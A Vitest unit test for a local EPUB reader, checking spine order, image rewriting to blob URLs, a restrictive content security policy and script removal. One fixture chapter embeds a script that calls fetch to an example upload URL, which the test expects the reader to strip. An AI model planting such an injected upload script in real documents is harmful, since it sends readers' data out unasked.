// @vitest-environment happy-dom
import { expect, it, vi } from 'vitest';
import { strToU8, zipSync } from 'fflate';
import { openLocalEpub } from './local-epub';
it('reads EPUB spine order and embedded images without sending document content to a server', () => {
  const create = vi.spyOn(URL, 'createObjectURL').mockReturnValue('blob:local-image');
  const revoke = vi.spyOn(URL, 'revokeObjectURL').mockImplementation(() => {});
  const data = zipSync({
    'META-INF/container.xml': strToU8('<container><rootfiles><rootfile full-path="OPS/content.opf"/></rootfiles></container>'),
    'OPS/content.opf': strToU8('<package><manifest><item id="a" href="chapter.xhtml" media-type="application/xhtml+xml"/><item id="image" href="figure.png" media-type="image/png"/></manifest><spine><itemref idref="a"/></spine></package>'),
    'OPS/chapter.xhtml': strToU8('<html><body><h1>期末复习</h1><p>第一章</p><img src="figure.png"/><script>fetch("https://example.com/upload")</script></body></html>'),
    'OPS/figure.png': new Uint8Array([1, 2, 3]),
  });
  const book = openLocalEpub(data.buffer as ArrayBuffer);
  expect(book.chapters[0].title).toBe('期末复习');
  expect(book.chapters[0].html).toContain('blob:local-image');
  expect(book.chapters[0].html).toContain("default-src 'none'");
  expect(book.chapters[0].html).not.toContain('<script>');
  book.dispose(); expect(revoke).toHaveBeenCalledWith('blob:local-image');
  create.mockRestore(); revoke.mockRestore();
});
